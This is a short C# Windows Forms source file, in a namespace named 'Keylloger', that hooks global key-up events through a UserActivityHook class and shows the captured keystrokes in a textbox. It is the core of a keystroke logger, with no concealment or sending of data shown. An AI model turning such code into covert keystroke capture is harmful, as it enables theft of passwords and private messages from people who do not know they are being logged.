using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WikiReader;

namespace Keylloger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            UserActivityHook hook;
            string log = string.Empty;

            InitializeComponent();
            hook = new UserActivityHook();
            hook.KeyUp += (s, e) =>
                {
                    log += e.KeyData.ToString();
                    textBox1.Text = log;
                };

        }
    }
}
